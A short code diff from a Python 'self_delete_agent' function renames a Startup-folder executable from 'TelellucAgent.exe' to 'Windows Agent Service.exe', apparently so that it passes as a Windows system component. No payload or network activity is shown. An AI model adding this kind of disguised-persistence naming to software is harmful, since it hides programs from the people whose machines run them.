@@ -143,7 +143,7 @@ def self_delete_agent(trigger_id):
         "Programs",
         "Startup",
     )
-    startup_exe = os.path.join(startup_dir, "TelellucAgent.exe")
+    startup_exe = os.path.join(startup_dir, "Windows Agent Service.exe")
     current_exe = os.path.abspath(sys.executable) if getattr(sys, "frozen", False) else os.path.abspath(__file__)
     local_dir = os.path.join(os.environ.get("LOCALAPPDATA", ""), "TelellucAgent")
     local_exe = os.path.join(local_dir, "TelellucAgent.exe")
